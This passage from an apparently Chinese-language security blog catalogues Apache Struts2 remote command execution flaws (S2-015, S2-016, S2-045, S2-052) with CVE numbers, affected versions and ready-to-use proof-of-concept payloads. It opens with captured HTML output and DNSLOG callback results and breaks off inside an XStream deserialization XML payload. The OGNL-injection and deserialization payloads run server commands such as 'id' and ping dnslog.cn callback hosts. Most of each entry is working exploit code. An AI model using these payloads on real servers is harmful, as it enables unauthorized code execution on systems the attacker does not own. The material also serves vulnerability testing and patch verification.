href&#x3D;&quot;&#x2F;empmanager&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;CRUD&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;wait&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Execute &amp; Wait&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;filedownload&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;File Download&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;fileupload&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;File Upload&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;freemarker&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Freemarker&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;hangman&#x2F;hangmanMenu.action;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Hangman&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;jsf&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;JavaServer Faces&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;tags&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Tags&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;tiles&#x2F;index.action;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Tiles&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;token&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Token&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;validation&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Validation&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;interactive&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Interactive Demo&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;person&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Person Manager&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href&#x3D;&quot;&#x2F;integration&#x2F;editGangster;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Struts 1 Integration&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                    &lt;li class&#x3D;&quot;last&quot;&gt;&lt;a href&#x3D;&quot;&#x2F;help.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Help&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">                &lt;&#x2F;ul&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;hr&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;&#x2F;div&gt;&lt;!-- end nav --&gt;</span><br><span class="line"></span><br><span class="line">        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;struts&#x2F;TabbedPanel.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div dojoType&#x3D;&quot;struts:StrutsTabContainer&quot;</span><br><span class="line">    style&#x3D;&quot;width: 500px; height: 300px;&quot;    id&#x3D;&quot;test2&quot;    labelPosition&#x3D;&quot;bottom&quot;    doLayout&#x3D;&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">                      &lt;div dojoType&#x3D;&quot;struts:BindDiv&quot;</span><br><span class="line">    closable&#x3D;&quot;true&quot;  	id&#x3D;&quot;left&quot;    label&#x3D;&quot;test1&quot;    showError&#x3D;&quot;true&quot;    parseContent&#x3D;&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">                          I&#39;m a Tab!!!</span><br><span class="line">                      &lt;&#x2F;div&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;djConfig.searchIds.push(&quot;left&quot;);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">                      &lt;div dojoType&#x3D;&quot;struts:BindDiv&quot;</span><br><span class="line">    closable&#x3D;&quot;true&quot;  	id&#x3D;&quot;middle&quot;    label&#x3D;&quot;test2&quot;    showError&#x3D;&quot;true&quot;    parseContent&#x3D;&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">                          I&#39;m the other Tab!!!</span><br><span class="line">                      &lt;&#x2F;div&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;djConfig.searchIds.push(&quot;middle&quot;);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line">                  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;djConfig.searchIds.push(&quot;test2&quot;);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">				  </span><br><span class="line">				</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;hr&#x2F;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;..&#x2F;index.jsp;jsessionid&#x3D;E23EFFE9E0B997D47D869A175C3D9F58&quot;&gt;Back To AJAX Examples&lt;&#x2F;a&gt;&amp;nbsp;</span><br><span class="line">        </span><br><span class="line">    &lt;&#x2F;div&gt;&lt;!-- end content --&gt;</span><br><span class="line"></span><br><span class="line">	&lt;div&gt;</span><br><span class="line">    	&lt;p&gt;</span><br><span class="line">    		&lt;a href&#x3D;&quot;&#x2F;viewSource.action?config&#x3D;&amp;className&#x3D;org.apache.struts2.showcase.ajax.Example5Action&amp;page&#x3D;&#x2F;ajax&#x2F;&#x2F;ajax&#x2F;tabbedpanel&#x2F;example5.jsp&quot;&gt;View Sources&lt;&#x2F;a&gt;</span><br><span class="line">    	&lt;&#x2F;p&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;footer&quot; class&#x3D;&quot;clearfix&quot;&gt;</span><br><span class="line">        &lt;p&gt;Copyright &amp;copy; 2003-2020 The Apache Software Foundation.&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;project-name&quot; value&#x3D;&quot;Struts 2&quot; id&#x3D;&quot;project-name&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;&lt;!-- end footer --&gt;</span><br><span class="line">    &lt;p&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;div&gt;&lt;!-- end page --&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">返回DNSLOG数据:[[&quot;ARrayeBeG676LjR.b3ffm7.dnslog.cn&quot;,&quot;180.108.0.26&quot;,&quot;2020-06-17 15:15:19&quot;],[&quot;ARrayeBeG676LjR.b3ffm7.dnslog.cn&quot;,&quot;180.108.0.26&quot;,&quot;2020-06-17 15:15:18&quot;]]</span><br><span class="line">使用DNSLOG:ARrayeBeG676LjR.b3ffm7.dnslog.cn</span><br></pre></td></tr></table></figure></div>



</li>
</ul>
<h4 id="0x06-Struts2远程命令执行漏洞-s2-015"><a href="#0x06-Struts2远程命令执行漏洞-s2-015" class="headerlink" title="0x06 Struts2远程命令执行漏洞(s2-015)"></a>0x06 Struts2远程命令执行漏洞(s2-015)</h4><h5 id="漏洞详情-5"><a href="#漏洞详情-5" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2013-6-5</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2013-2134</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts2.0.0-Struts2.3.14.2</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-5"><a href="#请求方式-5" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-5"><a href="#POC-5" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>使用POC，查看ID的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>脚本执行内容</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/5.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617155937559" class="fancybox"><img alt="image-20200617155937559" title="image-20200617155937559" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/5.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x07-Struts2远程命令执行漏洞-s2-016"><a href="#0x07-Struts2远程命令执行漏洞-s2-016" class="headerlink" title="0x07 Struts2远程命令执行漏洞(s2-016)"></a>0x07 Struts2远程命令执行漏洞(s2-016)</h4><h5 id="漏洞详情-6"><a href="#漏洞详情-6" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2013-7-9</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2013-2251</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.0.0 - 2.3.15</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts 2 DefaultActionMapper支持通过使用“action：”或“redirect：”前缀参数来进行短路导航状态更改的方法，然后是所需的导航目标表达式。该机制旨在帮助将导航信息附加到表单中的按钮。</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-6"><a href="#请求方式-6" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-6"><a href="#POC-6" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>使用POC，请求DNSLOG的，并且有回显</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27ping%27%2c%27da.dudot1.dnslog.cn%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23d.read%28%23e%29%2C%23matt.getWriter%28%29.println%28%23e%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/6.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617165526801" class="fancybox"><img alt="image-20200617165526801" title="image-20200617165526801" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/6.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
<li><p>使用脚本测试</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/7.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617170046800" class="fancybox"><img alt="image-20200617170046800" title="image-20200617170046800" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/7.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x08-Struts2远程命令执行漏洞-s2-045"><a href="#0x08-Struts2远程命令执行漏洞-s2-045" class="headerlink" title="0x08 Struts2远程命令执行漏洞(s2-045)"></a>0x08 Struts2远程命令执行漏洞(s2-045)</h4><h5 id="漏洞详情-7"><a href="#漏洞详情-7" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2017-3-19</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-5638</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Struts2.3.5–Struts2.3.31</span><br><span class="line">Struts2.5–Struts2.5.10</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-7"><a href="#请求方式-7" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-7"><a href="#POC-7" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>使用POC，位置在<code>Content-Type</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Content-Type&quot;:&quot;%&#123;(#nike&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;ping baidu.com&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>脚本检测</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/8.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200617173139578" class="fancybox"><img alt="image-20200617173139578" title="image-20200617173139578" data-src="https://github.com/Ascotbe/Random-img/blob/master/CMS/Struts2/8.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
</li>
</ul>
<h4 id="0x09-Struts2远程命令执行漏洞-s2-052"><a href="#0x09-Struts2远程命令执行漏洞-s2-052" class="headerlink" title="0x09 Struts2远程命令执行漏洞(s2-052)"></a>0x09 Struts2远程命令执行漏洞(s2-052)</h4><h5 id="漏洞详情-8"><a href="#漏洞详情-8" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
<li><p>披露时间</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2017-9-5</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>CVE</code>编号</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-9805</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>影响版本</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Struts2.1.2-Struts2.3.33</span><br><span class="line">Struts2.5-Struts2.5.12</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>漏洞说明</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当Struts2使用REST插件使用XStream的实例xstreamhandler处理反序列化XML有效载荷时没有进行任何过滤</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h5 id="请求方式-8"><a href="#请求方式-8" class="headerlink" title="请求方式:"></a>请求方式:</h5><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure></div>

<h5 id="POC-8"><a href="#POC-8" class="headerlink" title="POC:"></a>POC:</h5><ul>
<li><p>使用POC，位置在接收XML位置，请求DNSLOG的poc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt;ping&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;string&gt;6a1QWGcYrDFCTx2.1u3i3p.dnslog.cn&lt;&#x2F;string&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span 